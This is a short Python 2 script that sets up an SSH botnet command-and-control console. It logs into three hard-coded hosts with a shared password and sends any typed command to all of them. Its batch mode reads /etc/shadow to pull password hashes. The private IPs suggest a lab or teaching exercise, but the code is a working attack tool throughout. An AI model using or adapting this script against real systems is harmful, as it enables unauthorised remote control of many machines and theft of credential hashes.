import sys
import optparse
import pxssh

# Global
botNet = []

class Client:
    def __init__(self, host, user, password):
        self.host       = host
        self.user       = user
        self.password   = password
        self.session    = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e:
            #print e
            print '[-] Error connecting to ', self.host, '\n'

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

# Creates and adds a Client object to global botnet list
def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)

# Execute the given command for each Client in global botnet list
def botnetCommand(command):
    for client in botNet:
        if client.session != None:
            output = client.send_command(command)
            print '[*] Output from ', client.host
            print '[+] ', output, '\n'

# Interpreter mode - user types each command in a prompt
def imode():
    while 1:
        command = raw_input('SSH Botnet C&C > ')
        if command == 'exit':
            exit(0)
        else:
            botnetCommand(command)

# Batch mode - create a list of predefined commands to execute
def batch():
    botnetCommand('uname -v')
    botnetCommand('sudo cat /etc/shadow | grep $(whoami)')

def main():
    # Options parser
    parser = optparse.OptionParser()
    parser.add_option('-i', '--interpreter', \
                      help='run in interpreter mode', \
		      dest='IMODE', default=False, \
		      action='store_true'
		     )
    (opts, args) = parser.parse_args()

    # Initialize botnet clients
    addClient('172.16.13.130', 'bot', 'ucl2014')
    addClient('172.16.13.131', 'bot', 'ucl2014')
    addClient('172.16.13.132', 'bot', 'ucl2014')

    # Send command to all the clients
    if opts.IMODE:
        imode()
    else:
        batch()

if __name__ == '__main__':
    main()

